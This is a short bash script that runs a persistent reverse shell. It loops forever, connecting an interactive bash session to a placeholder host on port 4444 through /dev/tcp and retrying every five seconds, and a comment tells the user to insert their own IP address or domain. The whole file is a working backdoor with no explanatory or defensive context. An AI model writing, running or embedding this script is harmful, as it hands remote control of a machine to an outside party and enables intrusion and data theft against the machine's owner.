#!/bin/bash
while true; do
  # NOTE: Replace 'CHANGE_ME' with your actual IP address or domain
  bash -i >& /dev/tcp/CHANGE_ME/4444 0>&1  # Connects to CHANGE_ME:4444
  sleep 5  # Wait 5 seconds before attempting to reconnect
done
